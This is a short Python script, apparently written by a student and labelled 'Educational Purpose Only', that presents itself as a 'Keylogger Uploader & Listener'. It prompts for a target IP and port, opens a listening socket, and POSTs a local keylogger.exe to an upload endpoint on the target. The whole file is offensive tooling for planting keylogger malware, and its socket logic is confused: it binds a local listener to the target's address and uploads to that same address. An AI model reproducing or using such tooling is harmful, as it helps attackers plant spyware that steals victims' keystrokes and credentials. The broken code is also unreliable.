import os
import socket
import requests

def show_banner():
    print(r"""
  __   ____  ____  _  _
 / _\ (  _ \(    \( \/ )
/    \ ) _ ( ) D ( )  /
\_/\_/(____/(____/(__/
    
    Keylogger Uploader & Listener
    Educational Purpose Only!

    Author: Abdimajiid Ahmed Ali - New Generation University Student
    """)

show_banner()

target_ip = input("Enter Target IP Address: ")
target_port = int(input("Enter Target Port: "))
file_name = "keylogger.exe"

if not os.path.exists(file_name):
    print("[-] Error: File not found!")
    exit()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    server.bind((target_ip, target_port))
    server.listen(5)
    print(f"[+] Listening on {target_ip}:{target_port}")
except Exception as e:
    print(f"[-] Error: {e}")
    exit()

url = f"http://{target_ip}:{target_port}/upload"
files = {"file": open(file_name, "rb")}
try:
    response = requests.post(url, files=files)
    print("[+] Keylogger Uploaded Successfully")
    print("[+] Server Response:", response.text)
except Exception as e:
    print(f"[-] Upload Failed: {e}")
